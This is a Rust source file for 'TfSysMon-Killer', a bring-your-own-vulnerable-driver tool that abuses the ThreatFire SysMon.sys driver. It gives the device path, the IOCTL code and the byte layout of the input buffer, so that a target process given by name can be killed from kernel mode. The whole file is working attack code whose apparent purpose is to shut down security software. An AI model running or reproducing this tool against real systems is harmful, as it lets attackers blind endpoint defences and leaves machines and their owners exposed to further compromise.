use byovd_lib::{DriverConfig, Result};
use clap::Parser;

// ============================================================================
// Driver Configuration - TfSysMon / SysMon.sys (ThreatFire System Monitor)
// ============================================================================

struct TfSysMonDriver;

impl DriverConfig for TfSysMonDriver {
    fn driver_name(&self) -> &str {
        "SysMon"
    }

    fn driver_file(&self) -> &str {
        "sysmon.sys"
    }

    fn device_path(&self) -> &str {
        "\\\\.\\TfSysMon"
    }

    fn ioctl_code(&self) -> u32 {
        0xB4A00404
    }

    fn build_ioctl_input(&self, pid: u32, _process_name: &str) -> Vec<u8> {
        // 24-byte buffer: [4 bytes padding] [PID as DWORD] [16 bytes padding]
        // Driver reads PID from offset +4 in the input buffer
        let mut buf = vec![0u8; 24];
        buf[4..8].copy_from_slice(&pid.to_ne_bytes());
        buf
    }

    fn ioctl_output_size(&self) -> usize {
        4
    }
}

// ============================================================================
// CLI
// ============================================================================

#[derive(Parser)]
#[command(name = "TfSysMon-Killer", version, author = "BlackSnufkin")]
#[command(about = "BYOVD process killer using TfSysMon driver (ThreatFire)")]
struct Cli {
    /// Target process name (e.g., notepad.exe)
    #[arg(short = 'n', long = "name", required = true)]
    process_name: String,
}

// ============================================================================
// Main
// ============================================================================

fn main() -> Result<()> {
    let cli = Cli::parse();
    byovd_lib::run(&TfSysMonDriver, &cli.process_name, None)
}
